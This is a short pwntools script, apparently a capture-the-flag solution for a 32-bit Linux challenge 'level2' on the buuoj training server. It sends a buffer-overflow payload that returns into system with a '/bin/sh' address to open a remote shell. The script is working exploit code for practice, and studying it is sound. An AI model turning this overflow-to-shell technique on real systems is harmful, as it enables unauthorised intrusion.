from pwn import * 
from pwn import p32


debug = 0
gdb_is = 0
context(arch='i386',os = 'linux', log_level='DEBUG')
# context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./level2")
else:
    host = "node4.buuoj.cn"
    r = connect(host,28042)#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x4012ed')
    gdb.attach(r)
    pause()
    pass

# libc = ELF('./libc-2.31.so')
# elf = ELF('./vuln')
binsh = 0x804A024
payload = b'A'*0x88 +b'junk'+ p32(0x8048320) + p32(0) +p32(binsh)

r.send(payload)

r.interactive()
